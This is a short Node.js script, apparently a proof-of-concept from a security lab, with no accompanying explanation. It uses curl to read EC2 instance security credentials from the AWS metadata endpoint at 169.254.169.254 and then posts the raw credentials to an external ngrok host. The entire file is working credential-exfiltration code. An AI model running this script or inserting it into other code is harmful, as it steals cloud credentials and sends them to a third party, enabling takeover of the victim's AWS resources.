#!/usr/bin/env node
const { exec } = require("child_process");

// Step 1: Get the credentials from the metadata endpoint
const metadataEndpoint = "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
const postServer = "https://nomasec-labs.ngrok.app/response";

// Get credentials
exec(`curl -s "${metadataEndpoint}"`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error fetching metadata: ${error.message}`);
    process.exit(1);
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    // Proceed: AWS will usually return plain text here
  }

  // Step 2: Send raw response as POST body
  exec(`curl -X POST -H "Content-Type: application/json" -d '${stdout}' "${postServer}"`, (err, out, errout) => {
    if (err) {
      console.error(`Error sending POST: ${err.message}`);
      process.exit(1);
    }
    if (errout) {
      console.error(`Stderr from POST: ${errout}`);
    }
    console.log("Server acknowledged:", out);
  });
});
